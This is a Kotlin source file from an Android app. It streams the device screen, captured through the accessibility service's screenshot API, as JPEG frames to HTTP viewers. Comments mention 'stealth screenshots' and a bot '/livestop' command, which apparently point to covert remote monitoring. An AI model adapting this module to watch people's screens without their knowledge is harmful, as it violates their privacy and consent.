package com.ismartcoding.plain.services

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.hardware.HardwareBuffer
import android.os.Build
import android.view.Display
import com.ismartcoding.lib.logcat.LogCat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicInteger
import kotlin.coroutines.resume

/**
 * Drives rapid AccessibilityService.takeScreenshot() calls and broadcasts
 * each result as a compressed JPEG to all subscribed MJPEG HTTP viewers.
 *
 * Requires Android 11+ (API 30) — same as stealth screenshots.
 *
 * Performance notes:
 *  - [maxWidth]  scales the bitmap DOWN before JPEG compression. 720 → ~3–4× smaller JPEG,
 *    ~2–3× faster compress. This is the single biggest latency reducer.
 *  - [quality]   JPEG quality (1–95). 50 is visually fine for remote monitoring; 75 if you
 *    want crisper text. Lower = faster network transfer.
 *  - The [ByteArrayOutputStream] is reused across frames to avoid repeated GC.
 *
 * Lifecycle:
 *   [connect]    — call when an HTTP viewer starts streaming. Starts the
 *                  capture loop on the first viewer.
 *   [disconnect] — call when the viewer disconnects. Stops the loop when
 *                  the last viewer leaves.
 *   [forceStop]  — emergency stop from the bot /livestop command.
 */
object LiveScreenCapturer {

    private val executor = Executors.newSingleThreadExecutor()
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * JPEG frames broadcast to all active subscribers.
     * replay=0 so late subscribers only get new frames, never stale ones.
     * extraBufferCapacity=4 so the capture loop never blocks waiting for a slow reader.
     */
    private val _frames = MutableSharedFlow<ByteArray>(replay = 0, extraBufferCapacity = 4)
    val frames: SharedFlow<ByteArray> = _frames.asSharedFlow()

    private val viewerCount = AtomicInteger(0)
    private var captureJob: Job? = null

    /** Reused output buffer — reset between frames to avoid repeated allocation. */
    private val outBuf = ByteArrayOutputStream(64 * 1024)

    /** Frames per second. Clamped to [1, 15]. Default 5. */
    @Volatile var fps: Int = 5
        set(value) { field = value.coerceIn(1, 15) }

    /**
     * Maximum width of the bitmap BEFORE JPEG compression (pixels).
     * Height is scaled proportionally. 0 = use full device resolution.
     * Default 720 — greatly reduces JPEG size and compression time.
     * Supported presets: 1080 (full), 720 (HD), 540 (qHD), 360 (low).
     */
    @Volatile var maxWidth: Int = 720
        set(value) { field = if (value <= 0) 0 else value.coerceAtLeast(180) }

    /**
     * JPEG quality (1–95). 50 is fine for monitoring; 70 gives crisper text.
     * Lower = smaller frames = less lag on slow connections.
     */
    @Volatile var quality: Int = 55
        set(value) { field = value.coerceIn(1, 95) }

    val isRunning: Boolean get() = captureJob?.isActive == true
    val activeViewers: Int get() = viewerCount.get()

    /** Register a new HTTP viewer. Starts the capture loop if not already running. */
    fun connect() {
        viewerCount.incrementAndGet()
        startIfNeeded()
    }

    /** Unregister an HTTP viewer. Stops the capture loop when no viewers remain. */
    fun disconnect() {
        if (viewerCount.decrementAndGet() <= 0) {
            viewerCount.set(0)
            stopCapture()
        }
    }

    /** Force-stop regardless of viewer count (e.g. from /livestop bot command). */
    fun forceStop() {
        viewerCount.set(0)
        stopCapture()
        LogCat.d("LiveScreenCapturer: force stopped")
    }

    private fun startIfNeeded() {
        if (captureJob?.isActive == true) return
        captureJob = scope.launch {
            LogCat.d("LiveScreenCapturer: starting @ ${fps} FPS, maxWidth=$maxWidth, quality=$quality")
            while (isActive && viewerCount.get() > 0) {
                val t0 = System.currentTimeMillis()
                try {
                    val jpeg = captureJpeg()
                    if (jpeg != null) _frames.emit(jpeg)
                } catch (_: Throwable) {}
                val elapsed = System.currentTimeMillis() - t0
                val wait = (1000L / fps) - elapsed
                if (wait > 0) delay(wait)
            }
            LogCat.d("LiveScreenCapturer: capture loop exited")
        }
    }

    private fun stopCapture() {
        captureJob?.cancel()
        captureJob = null
    }

    private suspend fun captureJpeg(): ByteArray? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null
        val svc = PlainAccessibilityService.instance ?: return null
        val raw = takeBitmap(svc) ?: return null
        val bitmap = scaledBitmap(raw)
        return try {
            synchronized(outBuf) {
                outBuf.reset()
                bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outBuf)
                outBuf.toByteArray()
            }
        } catch (_: Throwable) { null }
        finally {
            if (bitmap !== raw) bitmap.recycle()
            raw.recycle()
        }
    }

    /**
     * Returns a scaled-down copy of [src] if [maxWidth] > 0 and the bitmap is wider
     * than [maxWidth]. Otherwise returns [src] unchanged (caller must recycle it).
     * Uses BILINEAR filtering — fast and visually acceptable for UI content.
     */
    private fun scaledBitmap(src: Bitmap): Bitmap {
        val mw = maxWidth
        if (mw <= 0 || src.width <= mw) return src
        val scale = mw.toFloat() / src.width
        val dstW = mw
        val dstH = (src.height * scale).toInt().coerceAtLeast(1)
        return Bitmap.createScaledBitmap(src, dstW, dstH, true)
    }

    @Suppress("DEPRECATION")
    private suspend fun takeBitmap(svc: AccessibilityService): Bitmap? =
        suspendCancellableCoroutine { cont ->
            try {
                svc.takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    executor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                            try {
                                val hb: HardwareBuffer = result.hardwareBuffer
                                val bmp = Bitmap.wrapHardwareBuffer(hb, result.colorSpace)
                                hb.close()
                                if (bmp != null) {
                                    val sw = bmp.copy(Bitmap.Config.ARGB_8888, false)
                                    bmp.recycle()
                                    cont.resume(sw)
                                } else cont.resume(null)
                            } catch (_: Throwable) { cont.resume(null) }
                        }
                        override fun onFailure(errorCode: Int) { cont.resume(null) }
                    },
                )
            } catch (_: Throwable) { cont.resume(null) }
        }
}
